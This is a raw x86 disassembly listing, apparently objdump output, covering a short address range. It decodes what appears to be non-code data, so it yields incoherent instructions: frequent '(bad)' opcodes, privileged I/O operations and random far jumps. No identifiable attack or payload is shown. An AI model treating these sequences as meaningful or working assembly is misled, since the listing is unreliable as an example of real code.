  41713b:	imul   eax,DWORD PTR [eax+ebx*8+0x72],0xfe7f6cbd
  417143:	fs push eax
  417145:	bound  ebp,QWORD PTR [ecx-0x1f14af6f]
  41714b:	jnp    0x4170e1
  41714d:	cwde   
  41714e:	pop    esi
  41714f:	fldenv [ebp+0x76]
  417152:	shr    BYTE PTR [eax-0x2dc1096d],1
  417158:	inc    esp
  417159:	loop   0x41718f
  41715b:	xor    BYTE PTR [edx],dl
  41715d:	int3   
  41715e:	retf   
  41715f:	pop    es
  417160:	je     0x417106
  417162:	pop    esp
  417163:	enter  0x8037,0xa3
  417167:	bound  esp,QWORD PTR [ebx+0x64]
  41716a:	aam    0x42
  41716c:	test   al,0xc0
  41716e:	jno    0x417158
  417170:	inc    ebp
  417171:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417172:	(bad)  
  417173:	in     eax,dx
  417174:	cli    
  417175:	sbb    al,0xf9
  417177:	push   edi
  417178:	jle    0x417141
  41717a:	jmp    0x79521712
  41717f:	or     eax,0xd7c7eb08
  417184:	sahf   
  417185:	xchg   edx,eax
  417186:	icebp  
  417187:	mov    dl,0xd4
  417189:	add    BYTE PTR [edi+0x731cad64],dh
  41718f:	rol    DWORD PTR [eax],0x0
	...
  4171f2:	add    BYTE PTR [eax],al
  4171f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171f5:	sbb    DWORD PTR [eax+0x1a],esi
  4171f8:	(bad)  
  4171f9:	jnp    0x4171e9
  4171fb:	mov    ebp,0x986526a4
  417200:	int3   
  417201:	jl     0x417270
  417203:	das    
  417204:	fs hlt 
  417206:	add    BYTE PTR [eax],al
  417208:	add    al,0x1
  41720a:	add    BYTE PTR [eax],al
  41720c:	pop    ebx
  41720d:	les    esi,FWORD PTR [edx]
  41720f:	mov    dl,0x1d
  417211:	sub    al,0x6b
  417213:	les    edi,FWORD PTR [ebp+0x1a]
  417216:	push   ebp
  417217:	sar    BYTE PTR [edx-0x13],0x53
  41721b:	mov    ds:0x73e66901,al
  417220:	fisttp DWORD PTR [ebx]
  417222:	mov    esp,0xa78fd22a
  417227:	into   
  417228:	dec    ebx
  417229:	sub    al,0xd
  41722b:	and    eax,0xc6651b45
  417230:	dec    edx
  417231:	fdivp  st(4),st
  417233:	mov    WORD PTR [ecx],ss
  417235:	shr    DWORD PTR [ebx-0x1f],1
  417238:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417239:	loop   0x4171f6
  41723b:	scas   al,BYTE PTR es:[edi]
  41723c:	xor    cl,ah
  41723e:	arpl   WORD PTR [ebx],dx
  417240:	int3   
  417241:	sub    ah,cl
  417243:	sub    esi,DWORD PTR [ebp+0x72]
  417246:	jl     0x4172bb
  417248:	pop    ebx
  417249:	popa   
  41724a:	(bad)  
  41724b:	sub    al,0xc6
  41724d:	mov    dl,0x62
  41724f:	jge    0x41726a
  417251:	aaa    
  417252:	and    eax,0x9cadbb9
  417257:	jmp    0x417286
  417259:	or     al,0xe3
  41725b:	mov    eax,0x41122ed4
  417260:	retf   
  417261:	popf   
  417262:	cli    
  417263:	fdivr  DWORD PTR [ebx-0x44]
  417266:	repz xlat BYTE PTR ds:[ebx]
  417268:	test   WORD PTR [esi+ebx*1-0x48],di
  41726d:	mov    esi,0x6a732fc0
  417272:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417273:	dec    edi
  417274:	mov    dl,0x54
  417276:	sahf   
  417277:	cdq    
  417278:	js     0x417243
  41727a:	shr    DWORD PTR [esp+edx*2],0x6
  41727e:	retf   
  41727f:	imul   esp,DWORD PTR [esi],0x50
  417282:	add    eax,0x341163a5
  417287:	jmp    0x5e1e:0x2ea9f01a
  41728e:	cs adc bh,bl
  417291:	push   edx
  417292:	loop   0x417294
  417294:	inc    ecx
  417295:	(bad)  
  417296:	int    0x34
  417298:	loopne 0x4172d8
  41729a:	cwde   
  41729b:	int    0xbf
  41729d:	or     ebx,edi
  41729f:	into   
  4172a0:	and    bh,al
  4172a2:	sub    DWORD PTR [edx-0x58cfef46],eax
  4172a8:	dec    esi
  4172a9:	das    
  4172aa:	add    dl,BYTE PTR [eax+edi*4-0x794f1c0e]
  4172b1:	shl    ecx,cl
  4172b3:	mov    ah,0x59
  4172b5:	loope  0x41727d
  4172b7:	test   DWORD PTR [ecx+0xf],ecx
  4172ba:	sub    ch,BYTE PTR [ecx+0x45]
  4172bd:	lds    ebx,FWORD PTR [esi-0x57]
  4172c0:	js     0x417283
  4172c2:	fstp   TBYTE PTR [esi+0xc]
  4172c5:	add    eax,0x56791161
  4172ca:	imul   esp,DWORD PTR [ebp-0x36],0xffffff86
  4172ce:	sar    DWORD PTR [eax-0x1dc0084c],0xbe
  4172d5:	mov    cl,0xed
  4172d7:	jae    0x4172f7
  4172d9:	inc    edx
  4172da:	mov    ah,0x14
  4172dc:	mov    DWORD PTR [ebp+0x13],edi
  4172df:	jmp    0x41726b
  4172e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4172e2:	lahf   
  4172e3:	and    cl,ch
  4172e5:	sub    eax,0xe035b9be
  4172ea:	sub    BYTE PTR [edi-0x13],al
  4172ed:	ret    0x78b6
  4172f0:	dec    ebx
  4172f1:	out    dx,eax
  4172f2:	push   ss
  4172f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172f4:	jne    0x417362
  4172f6:	push   0xcc5c8ea5
  4172fb:	stos   DWORD PTR es:[edi],eax
  4172fc:	inc    ecx
  4172fd:	jmp    0xc18d5f88
  417302:	xor    bl,BYTE PTR [ecx+0x76]
  417305:	mov    BYTE PTR [esp+edx*4+0x24e948d6],0x8c
  41730d:	das    
  41730e:	add    ecx,esp
	...
  417374:	imul   edi,DWORD PTR [edi+edx*8-0x168028a2],0x8016bbf
  41737f:	cvtps2pd xmm5,QWORD PTR gs:[edi+0xf5683f]
  417387:	add    BYTE PTR [ecx+eax*1],al
  41738a:	add    BYTE PTR [eax],al
  41738c:	mov    ah,0xe3
  41738e:	ins    BYTE PTR es:[edi],dx
  41738f:	push   0x4d
  417391:	and    bh,BYTE PTR [eax]
  417393:	sbb    cl,BYTE PTR [ecx-0x43]
  417396:	shl    ch,cl
  417398:	dec    esi
  417399:	mov    ah,0xfb
  41739b:	pop    ecx
  41739c:	dec    eax
  41739d:	inc    edi
  41739e:	shl    DWORD PTR [eax+0x2becdb81],cl
  4173a4:	out    0x9e,al
  4173a6:	ins    BYTE PTR es:[edi],dx
  4173a7:	add    ebp,DWORD PTR [edi+0x21bebf01]
  4173ad:	in     al,dx
  4173ae:	and    al,0xdf
  4173b0:	cwde   
  4173b1:	(bad)  
  4173b2:	add    BYTE PTR [eax+0x48],dl
  4173b5:	das    
  4173b6:	stos   DWORD PTR es:[edi],eax
  4173b7:	mov    esi,0xd8cbc698
  4173bc:	scas   al,BYTE PTR es:[edi]
  4173bd:	pop    edi
  4173be:	int    0x3c
  4173c0:	test   al,0xef
  4173c2:	cmp    eax,0xecffdf1e
  4173c7:	cmp    BYTE PTR [edx+esi*2],al
  4173ca:	rol    DWORD PTR [eax+0x4b49ae18],0xee
  4173d1:	add    eax,0xe33bdb66
  4173d6:	xor    ebx,eax
  4173d8:	jmp    0x417434
  4173da:	jle    0x417432
  4173dc:	lock pop esi
  4173de:	xchg   dh,dl
  4173e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4173e1:	ins    DWORD PTR es:[edi],dx
  4173e2:	rcl    DWORD PTR [ecx-0x4c475e28],cl
  4173e8:	cmp    BYTE PTR [ebx-0x22e75a03],ah
  4173ee:	add    edx,DWORD PTR [ebx-0x7c]
  4173f1:	sub    al,0x21
  4173f3:	xchg   esi,eax
  4173f4:	fisub  WORD PTR [ecx-0x3fc1e00b]
  4173fa:	xchg   ebp,eax
  4173fb:	or     ebx,esi
  4173fd:	jge    0x4173d4
  4173ff:	test   eax,0x584b46dd
  417404:	jg     0x417392
  417406:	push   cs
  417407:	inc    esi
  417408:	in     al,dx
  417409:	mov    esp,0x8d8eb029
  41740e:	aaa    
  41740f:	and    ebx,DWORD PTR [edx-0x295139b9]
  417415:	clc    
  417416:	push   edx
  417417:	lods   al,BYTE PTR ds:[esi]
  417418:	pop    ebx
  417419:	pop    esp
  41741a:	imul   esp,DWORD PTR [edi-0x1d21cc88],0x27a4c9d4
  417424:	inc    edx
  417425:	or     dl,BYTE PTR es:[esp+edi*2+0x49cc3ca0]
  41742d:	jno    0x41746a
  41742f:	std    
  417430:	stos   BYTE PTR es:[edi],al
  417431:	call   0xb6ff5e16
  417436:	pop    eax
  417437:	ret    
  417438:	(bad)  
  417439:	mov    eax,0x896eeb99
  41743e:	cmp    al,0x70
  417440:	cwde   
  417441:	pop    ds
  417442:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417443:	fcom   DWORD PTR [edx]
  417445:	push   ebx
  417446:	scas   eax,DWORD PTR es:[edi]
  417447:	daa    
  417448:	dec    edi
  417449:	sahf   
  41744a:	mov    DWORD PTR [ecx+edx*2-0x6b2ba0bb],edi
  417451:	dec    ebp
  417452:	xchg   edi,eax
  417453:	pop    ebx
  417454:	retf   0xf1ac
  417457:	dec    ebp
  417458:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417459:	jno    0x4174aa
  41745b:	or     eax,ecx
  41745d:	or     al,0xaa
  41745f:	add    eax,0x6509fb5
  417464:	gs inc ebx
  417466:	cmp    cl,BYTE PTR [edi-0x4269140d]
  41746c:	iret   
  41746d:	fld    DWORD PTR [eax+0x5465444f]
  417473:	xlat   BYTE PTR ds:[ebx]
  417474:	ins    BYTE PTR es:[edi],dx
  417475:	adc    BYTE PTR [edx-0xb],ah
  417478:	dec    ebx
  417479:	call   0x320fce00
  41747e:	ss fcmovnu st,st(2)
  417481:	jno    0x417488
  417483:	rcr    edx,1
  417485:	(bad)  
  417486:	jmp    0x1647:0x3857d1a9
  41748d:	and    eax,ebp
  41748f:	cmp    al,BYTE PTR [eax]
	...
  4174f1:	add    BYTE PTR [eax],al
  4174f3:	add    BYTE PTR [ecx+0x6b0c6aba],dl
  4174f9:	fdivr  st(7),st
  4174fb:	mov    edi,0x212a686b
  417500:	call   0xf6:0x6c893804
  417507:	add    BYTE PTR [ecx+eax*1],al
  41750a:	add    BYTE PTR [eax],al
  41750c:	(bad)  
  41750d:	std    
  41750e:	in     al,0xba
  417510:	sbb    bh,BYTE PTR ds:0xae0d46f9
  417516:	test   ebx,ecx
  417518:	jae    0x4174d7
  41751a:	je     0x4174e6
  41751c:	or     eax,eax
  41751e:	add    ch,BYTE PTR [eax]
  417520:	mov    ?,eax
  417522:	jbe    0x4174df
  417524:	ret    
  417525:	jl     0x4174d7
  417527:	xchg   esi,eax
  417528:	fcmovnbe st,st(0)
  41752a:	test   DWORD PTR [ebx+0x22034f7e],ebp
  417530:	std    
  417531:	push   cs
  417532:	mov    eax,ebp
  417534:	mov    dl,0x94
  417536:	ret    0x1661
  417539:	loope  0x417554
  41753b:	jno    0x41753b
  41753d:	xor    DWORD PTR [ebx-0x75ad542e],0xffffff8d
  417544:	xor    al,0xea
  417546:	add    al,ch
  417548:	(bad)  
  417549:	push   edx
  41754a:	push   0x5c
  41754c:	pop    esp
  41754d:	test   al,0x86
  41754f:	push   esp
  417550:	mov    cl,0x3c
  417552:	cmp    esi,DWORD PTR [esi-0x72edf4cf]
  417558:	xchg   ebx,eax
  417559:	sub    DWORD PTR [eax-0xb66058c],0x67
  417560:	das    
  417561:	dec    esi
  417562:	mov    ebp,0xa26eb260
  417567:	sub    eax,0x628d7664
  41756c:	(bad)  
  41756d:	enter  0x421,0xb9
  417571:	(bad)  
  417573:	or     ah,BYTE PTR [eax+edi*4+0x2ca404c3]
  41757a:	sub    DWORD PTR [ecx+0x10],edx
  41757d:	(bad)  
  41757e:	mov    ds:0x96333ac,al
  417583:	pop    edi
  417584:	popa   
  417585:	inc    eax
  417586:	mov    al,0x30
  417588:	test   BYTE PTR [edx-0x376ddf35],dh
  41758e:	cmc    
  41758f:	mov    ebx,0xcad03dbe
  417594:	xor    al,0x5
  417596:	mov    BYTE PTR [eax-0x60],dl
  417599:	mov    ds:0x3109d2b2,al
  41759e:	dec    eax
  41759f:	jp     0x4175a3
  4175a1:	js     0x41753f
  4175a3:	popf   
  4175a4:	es mov eax,0xa57e21c
  4175aa:	fisubr WORD PTR [ecx+0x28]
  4175ad:	adc    DWORD PTR [ecx-0x56],0x7610955b
  4175b4:	and    BYTE PTR [eax+0x16f184ef],dh
  4175ba:	mov    ds:0x5c2aed93,eax
  4175bf:	push   es
  4175c0:	aam    0x95
  4175c2:	fchs   
  4175c4:	retf   
  4175c5:	xchg   ebp,eax
  4175c6:	sahf   
  4175c7:	mov    ah,0xbe
  4175c9:	fwait
  4175ca:	push   cs
  4175cb:	xchg   esi,eax
  4175cc:	dec    esi
  4175cd:	cmc    
  4175ce:	mov    esi,0xcdf841e9
  4175d3:	js     0x4175b8
  4175d5:	(bad)  
  4175d6:	scas   eax,DWORD PTR es:[edi]
  4175d7:	sbb    DWORD PTR [edx-0x1ed960e4],ebx
  4175dd:	mov    cl,0x2e
  4175df:	clts   
  4175e1:	lahf   
  4175e2:	scas   eax,DWORD PTR es:[edi]
  4175e3:	adc    dl,ch
  4175e5:	sbb    eax,0xbb1c49f8
  4175ea:	inc    ebx
  4175eb:	add    ch,dl
  4175ed:	add    bh,bl
  4175ef:	mov    edi,0xc3b99b8e
  4175f4:	sub    dl,BYTE PTR [ebx+0x26]
  4175f7:	jg     0x41763c
  4175f9:	xchg   edx,eax
  4175fa:	pop    ds
  4175fb:	sub    al,0x8c
  4175fd:	add    BYTE PTR [ebx+0x6c],al
  417600:	imul   ecx,DWORD PTR [edi-0x3],0x95191aeb
  417607:	cmp    ch,BYTE PTR [ecx+0x41]
  41760a:	mov    eax,0x56b9524d
  41760f:	mov    al,BYTE PTR [eax]
	...
  417671:	add    BYTE PTR [eax],al
  417673:	add    BYTE PTR [ecx-0x20b02c99],ch
  417679:	(bad)  
  41767a:	mov    ebp,0x411f24e7
  41767f:	ficom  DWORD PTR [eax]
  417681:	fisubr WORD PTR [edx+0xf77092]
  417687:	add    BYTE PTR [ecx+eax*1],al
  41768a:	add    BYTE PTR [eax],al
  41768c:	(bad)
  41768f:	data16 adc BYTE PTR [ebp+0x1af2f0e5],dh
  417696:	xchg   DWORD PTR [eax-0x783d0fe5],ecx
  41769c:	js     0x417664
  41769e:	jp     0x4176a4
  4176a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4176a1:	rol    BYTE PTR [ecx+edx*2],cl
  4176a4:	mov    esp,0x62425242
  4176a9:	dec    ebx
  4176aa:	dec    ebx
  4176ab:	adc    BYTE PTR [ebp+0x3e48c701],dh
  4176b1:	xchg   ebp,eax
  4176b2:	bound  edx,QWORD PTR [ebp-0x53]
  4176b5:	hlt    
  4176b6:	cmp    ecx,DWORD PTR [ebx]
  4176b8:	jo     0x417641
  4176ba:	fnsave [ebp-0x44]
  4176bd:	ins    BYTE PTR es:[edi],dx
  4176be:	scas   al,BYTE PTR es:[edi]
  4176bf:	sub    eax,0x73ce31ee
  4176c4:	mov    WORD PTR [esi],?
  4176c6:	mov    ecx,DWORD PTR cs:[edx+edx*8+0x6fda3fd6]
  4176ce:	loop   0x4176c6
  4176d0:	ins    DWORD PTR es:[edi],dx
  4176d1:	mov    dl,0x3e
  4176d3:	adc    al,0xe7
  4176d5:	inc    esi
  4176d6:	mov    edx,0x76bc2421
  4176db:	xor    eax,DWORD PTR [ecx]
  4176dd:	out    0x2,al
  4176df:	(bad)  [ebx]
  4176e1:	cmp    esi,esp
  4176e3:	push   ebx
  4176e4:	pushf  
  4176e5:	aas    
  4176e6:	mov    esi,0x669f1756
  4176eb:	sbb    edx,esp
  4176ed:	cli    
  4176ee:	ins    BYTE PTR es:[edi],dx
  4176ef:	adc    eax,0xea38af8f
  4176f4:	sbb    eax,0x1cb55b07
  4176f9:	int    0x5c
  4176fb:	mov    bh,0x20
  4176fd:	mov    ds:0x28b6441c,eax
  417702:	xchg   ebp,eax
  417703:	cmp    DWORD PTR [ebx+0x5704c4de],ebp
  417709:	jb     0x41773b
  41770b:	(bad)  
  41770c:	jmp    0xc635:0x30072bf
  417713:	push   edx
  417714:	mov    al,ds:0x8fb2c782
  417719:	jle    0x4176f8
  41771b:	mov    ecx,0x1b834a39
  417720:	gs ret 0xea21
  417724:	inc    esp
  417725:	(bad)  
  417726:	jno    0x417775
  417728:	inc    esi
  417729:	xor    ch,BYTE PTR [esi]
  41772b:	or     eax,0xfe43b63c
  417730:	mov    bh,dl
  417732:	xor    DWORD PTR [ecx-0x11],edx
  417735:	inc    edi
  417736:	inc    esi
  417737:	add    DWORD PTR [esi-0x3a],eax
  41773a:	ds jb  0x417786
  41773d:	arpl   WORD PTR [esi],bx
  41773f:	es nop
  417741:	xor    DWORD PTR [ebx],0xd58492d4
  417747:	stc    
  417748:	xchg   edx,eax
  417749:	out    dx,al
  41774a:	dec    esi
  41774b:	lea    ebp,[ebp-0x46]
  41774e:	out    dx,eax
  41774f:	mov    al,0x88
  417751:	sub    edx,edx
  417753:	mov    esi,0x5c4bd8fa
  417758:	fstp   TBYTE PTR [ebp-0x71]
  41775b:	pop    esi
  41775c:	(bad)  
  41775e:	retf   
  41775f:	dec    edi
  417760:	and    eax,0x7499e036
  417765:	mov    ds:0xe260a0ae,eax
  41776a:	push   esi
  41776b:	sub    dl,BYTE PTR [edi+0x44]
  41776e:	pop    ss
  41776f:	mov    bl,0x91
  417771:	or     eax,0x63fe46ed
  417776:	jp     0x4177b2
  417778:	adc    al,0xc6
  41777a:	jecxz  0x417786
  41777c:	pop    ecx
  41777d:	cdq    
  41777e:	iret   
  41777f:	fadd   QWORD PTR [ecx]
  417781:	adc    al,dh
  417783:	test   al,0xf9
  417785:	xlat   BYTE PTR ds:[ebx]
  417786:	arpl   bx,dx
  417788:	sbb    esp,DWORD PTR [esi]
  41778a:	out    0xab,al
  41778c:	sbb    ecx,0xfffffff8
  41778f:	cmp    eax,DWORD PTR [eax]
	...
  4177f1:	add    BYTE PTR [eax],al
  4177f3:	add    cl,ch
  4177f5:	push   cs
  4177f6:	(bad)  
  4177f7:	pop    ss
  4177f8:	push   edi
  4177fa:	jmp    0x233417fd
  4177ff:	rol    BYTE PTR [esi],cl
  417801:	lock cmp al,0xc1
  417804:	je     0x4177fe
  417806:	add    BYTE PTR [eax],al
  417808:	add    al,0x1
  41780a:	add    BYTE PTR [eax],al
  41780c:	fsubr  QWORD PTR [edx-0x63c80d54]
  417812:	fst    DWORD PTR [eax+0x3f]
  417815:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417816:	fisttp QWORD PTR [ecx]
  417818:	lahf   
  417819:	pusha  
  41781a:	dec    esp
  41781b:	mov    bh,0x59
  41781d:	daa    
  41781e:	stos   DWORD PTR es:[edi],eax
  41781f:	jb     0x4177f2
  417821:	jo     0x41786d
  417823:	fs push ebp
  417825:	shl    BYTE PTR [ebp-0x71],1
  417828:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417829:	arpl   WORD PTR [ebp+ebp*2+0xd],di
  41782d:	shl    BYTE PTR [ecx-0x41ab27c1],0x4c
  417834:	ins    BYTE PTR es:[edi],dx
  417835:	fstp   DWORD PTR [edx-0x60]
  417838:	rol    DWORD PTR [ebx],cl
  41783a:	sub    eax,0xe4e02feb
  41783f:	test   bh,0x95
  417842:	ds in  eax,dx
  417844:	mov    ebx,0xa7dbf5f7
  417849:	mov    dl,0xb4
  41784b:	das    
  41784c:	xchg   esp,eax
  41784d:	cmp    ch,BYTE PTR [esi]
  41784f:	xor    edx,DWORD PTR [ebx+0x15]
  417852:	icebp  
  417853:	pop    ecx
  417854:	mov    ecx,0x6118656f
  417859:	(bad)  
  41785a:	loop   0x417897
  41785c:	clc    
  41785d:	imul   eax,DWORD PTR [eax],0x62ad0f66
  417863:	aas    
  417864:	mov    ecx,esp
  417866:	bound  edi,QWORD PTR [esi-0x6]
  417869:	push   edi
  41786a:	mov    bh,0x22
  41786c:	cmp    ebx,DWORD PTR [ebx-0x56b614d]
  417872:	dec    edx
  417873:	cli    
  417874:	cmp    edx,DWORD PTR [eax+0x49]
  417877:	inc    ebp
  417878:	jl     0x41780e
  41787a:	xchg   esi,eax
  41787b:	outs   dx,BYTE PTR ds:[esi]
  41787c:	sahf   
  41787d:	xlat   BYTE PTR ds:[ebx]
  41787e:	jecxz  0x417824
  417880:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  417882:	jns    0x417866
  417884:	pop    edi
  417885:	mov    DWORD PTR [edx+0x65],esp
  417888:	cmp    bh,BYTE PTR [edi]
  41788a:	mov    al,ds:0xf63feef2
  41788f:	mov    dl,0x86
  417891:	repnz and al,0x9f
  417894:	and    al,0x3d
  417896:	pop    ds
  417897:	(bad)  
  417899:	add    eax,0xa4d8b149
  41789e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41789f:	les    ecx,FWORD PTR [eax]
  4178a1:	push   esi
  4178a2:	outs   dx,DWORD PTR ds:[esi]
  4178a3:	add    bl,BYTE PTR [ebx-0x322e8b10]
  4178a9:	sti    
  4178aa:	xchg   esp,eax
  4178ab:	adc    ah,cl
  4178ad:	lock jl 0x4178d9
  4178b0:	es mov bl,0x4e
  4178b3:	jb     0x4178b2
  4178b5:	xchg   DWORD PTR [ebx],ecx
  4178b7:	xor    al,0xba
  4178b9:	int3   
  4178ba:	cmp    DWORD PTR [ecx+0x68e22493],esp
  4178c0:	mov    ?,WORD PTR [esi-0xee3c985]
  4178c6:	and    cl,dh
  4178c8:	adc    esi,DWORD PTR [edx+0x26]
  4178cb:	(bad)  
  4178cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4178cd:	std    
  4178ce:	lods   eax,DWORD PTR ds:[esi]
  4178cf:	sub    dl,al
  4178d1:	xor    al,0xec
  4178d3:	cdq    
  4178d4:	inc    edx
  4178d5:	sub    edx,DWORD PTR [eax]
  4178d7:	(bad)  
  4178d8:	and    al,0x92
  4178da:	pop    esi
  4178db:	call   0x368e797f
  4178e0:	push   edi
  4178e1:	ror    DWORD PTR [esi+0x73f0b842],0x61
  4178e8:	fwait
  4178e9:	cmp    BYTE PTR ds:0x2ca8d9fd,ah
  4178ef:	or     al,0xd0
  4178f1:	fadd   st(2),st
  4178f3:	mov    fs,WORD PTR [esp+ebx*1-0x6eb8ebef]
  4178fa:	sbb    cl,al
  4178fc:	out    0x14,al
  4178fe:	dec    esp
  4178ff:	mov    ch,0xa9
  417901:	push   edx
  417902:	add    ebp,DWORD PTR [esi]
  417904:	retf   
  417905:	ins    DWORD PTR es:[edi],dx
  417906:	sub    cl,BYTE PTR [edx]
  417908:	scas   al,BYTE PTR es:[edi]
  417909:	mov    dh,0x15
  41790b:	fcomp  DWORD PTR [eax]
  41790d:	pop    ss
  41790e:	dec    eax
  41790f:	jbe    0x417911
	...
  417971:	add    BYTE PTR [eax],al
  417973:	add    BYTE PTR [eax+0x41],bl
  417976:	pop    ds
  417977:	lods   eax,DWORD PTR ds:[esi]
  417978:	pop    ds
  417979:	(bad)  
  41797a:	cli    
  41797b:	cmc    
  41797c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41797d:	retf   0xe5d4
  417980:	push   ss
  417981:	rcr    DWORD PTR [edx+esi*2+0xf978],0x4
  417989:	add    DWORD PTR [eax],eax
  41798b:	add    BYTE PTR [eax+0x2678cc86],ch
  417991:	test   esp,0xd243f739
  417997:	push   ss
  417998:	cwde   
  417999:	je     0x417991
  41799b:	fisubr WORD PTR [edi+0x7b]
  41799e:	ins    BYTE PTR es:[edi],dx
  41799f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4179a0:	jnp    0x417967
  4179a2:	push   DWORD PTR [esi-0x1bbbae89]
  4179a8:	fiadd  WORD PTR [edx+esi*4+0x15]
  4179ac:	push   eax
  4179ad:	out    dx,eax
  4179ae:	or     al,0xd8
  4179b0:	mov    ebx,0xc8d8cb8f
  4179b5:	das    
  4179b6:	fisubr DWORD PTR [edi-0x6602372f]
  4179bc:	xor    al,0xde
  4179be:	shr    cl,1
  4179c0:	push   es
  4179c1:	js     0x41796e
  4179c3:	dec    edi
  4179c4:	push   eax
  4179c5:	in     al,dx
  4179c6:	ss ret 0x361
  4179ca:	push   cs
  4179cb:	sub    edx,eax
  4179cd:	cs dec eax
  4179cf:	out    0xb2,al
  4179d1:	pop    ecx
  4179d2:	push   es
  4179d3:	mov    ds,WORD PTR [ecx-0x6d]
  4179d6:	mov    dl,0x88
  4179d8:	xlat   BYTE PTR ds:[ebx]
  4179d9:	int    0xdc
  4179db:	jbe    0x417a06
  4179dd:	cmc    
  4179de:	pop    eax
  4179df:	mov    WORD PTR [edi+ebx*8+0x68],es
  4179e3:	in     al,dx
  4179e4:	loop   0x417a28
  4179e6:	scas   al,BYTE PTR es:[edi]
  4179e7:	mov    WORD PTR [ecx+0x42],?
  4179ea:	call   0x2c97b3c3
  4179ef:	mov    al,0xae
  4179f1:	adc    ah,bh
  4179f3:	ret    0xcd1d
  4179f6:	push   es
  4179f7:	or     bh,ah
  4179f9:	mov    ch,0xcb
  4179fb:	xchg   ecx,eax
  4179fc:	popa   
  4179fd:	sbb    eax,0x3fb5c822
  417a02:	fsubp  st(7),st
  417a04:	jmp    0x9dd0:0x9cd31fc9
  417a0b:	mov    bl,0xdc
  417a0d:	and    ebp,edx
  417a0f:	popf   
  417a10:	pop    esi
  417a11:	mov    eax,0x3470075f
  417a16:	shr    BYTE PTR [ecx-0x40],0x63
  417a1a:	lds    esp,FWORD PTR [ecx]
  417a1c:	sub    BYTE PTR [edx-0x68],ch
  417a1f:	jbe    0x417a8d
  417a21:	inc    ecx
  417a22:	mov    ah,0x90
  417a24:	push   esi
  417a25:	add    al,dl
  417a27:	xchg   edx,eax
  417a28:	mov    eax,ds:0x9f2c038f
  417a2d:	jae    0x417a5b
  417a2f:	xchg   edx,eax
  417a30:	sub    eax,0x95583f8d
  417a35:	aas    
  417a36:	jo     0x4179db
  417a38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a39:	stos   DWORD PTR es:[edi],eax
  417a3a:	popf   
  417a3b:	and    ebx,DWORD PTR [edx-0x1ea69574]
  417a41:	jns    0x417abc
  417a43:	inc    ebx
  417a44:	pop    edi
  417a45:	inc    ebx
  417a46:	mov    bl,0x33
  417a48:	sub    BYTE PTR [eax+0x1f941bcb],al
  417a4e:	ins    DWORD PTR es:[edi],dx
  417a4f:	dec    edx
  417a50:	sub    eax,0x69e74f16
  417a55:	mov    ?,ecx
  417a57:	inc    eax
  417a58:	test   al,0xca
  417a5a:	xchg   esp,eax
  417a5b:	dec    ebp
  417a5c:	mov    ds:0x75ec3c9f,al
  417a61:	ss test ebp,edi
  417a64:	fisub  WORD PTR [eax-0x9099161]
  417a6a:	and    al,0xe5
  417a6c:	enter  0xf9bc,0xce
  417a70:	repz les esp,FWORD PTR [edx+0x58]
  417a74:	data16 (bad) 
  417a77:	mov    ebx,0x96cdfe7e
  417a7c:	adc    BYTE PTR [eax+0x4ca5ad6e],0x79
  417a83:	jl     0x417b01
  417a85:	xchg   edx,eax
  417a86:	sbb    eax,eax
  417a88:	sub    DWORD PTR ds:0xbf70120,0x3b
  417a8f:	jmp    0x417a94
	...
  417af4:	das    
  417af5:	stos   DWORD PTR es:[edi],eax
  417af6:	cdq    
  417af7:	inc    ecx
  417af8:	popf   
  417af9:	jae    0x417afa
  417afb:	out    dx,eax
  417afc:	(bad)  [eax]
  417afe:	xor    ebx,DWORD PTR [ecx+0x29affc7f]
  417b04:	jl     0x417b00
  417b06:	add    BYTE PTR [eax],al
  417b08:	add    al,0x1
  417b0a:	add    BYTE PTR [eax],al
  417b0c:	stos   DWORD PTR es:[edi],eax
  417b0d:	mov    edx,0x9e33519d
  417b12:	fnstcw WORD PTR [eax-0x62]
  417b15:	push   ecx
  417b16:	lahf   
  417b17:	popf   
  417b18:	mov    dl,0xae
  417b1a:	std    
  417b1b:	lods   eax,DWORD PTR ds:[esi]
  417b1c:	pushf  
  417b1d:	shr    DWORD PTR [ebp-0x6a],1
  417b20:	mov    dl,0x50
  417b22:	push   ecx
  417b23:	cmc    
  417b24:	fimul  DWORD PTR [edi-0x17cda8dd]
  417b2a:	adc    DWORD PTR [ecx+0x10],0x54
  417b2e:	sub    eax,0x55
  417b31:	mov    esi,0xfd82a1b5
  417b36:	ret    0xd9e8
  417b39:	aad    0xbc
  417b3b:	cmp    al,BYTE PTR [ecx+0x77]
  417b3e:	xor    edx,edx
  417b40:	js     0x417b08
  417b42:	enter  0xc22c,0xa7
  417b46:	xor    bh,BYTE PTR [ecx]
  417b48:	jno    0x417b64
  417b4a:	jo     0x417b51
  417b4c:	fdiv   DWORD PTR [edi-0x27]
  417b4f:	call   0xe716aea3
  417b54:	inc    esp
  417b55:	or     bh,dl
  417b57:	cs push ss
  417b59:	test   eax,0x9ed0c1dd
  417b5e:	xor    BYTE PTR [ebx-0x644e12e6],ch
  417b64:	out    dx,al
  417b65:	(bad)  
  417b66:	sbb    bl,BYTE PTR [ecx-0x3397b5aa]
  417b6c:	faddp  st(0),st
  417b6e:	pop    esi
  417b6f:	dec    edx
  417b70:	ins    BYTE PTR es:[edi],dx
  417b71:	xchg   esi,eax
  417b72:	dec    ecx
  417b73:	fimul  WORD PTR [edi]
  417b75:	mov    dl,0x9
  417b77:	xchg   edx,eax
  417b78:	dec    edx
  417b79:	out    dx,eax
  417b7a:	jg     0x417b54
  417b7c:	cwde   
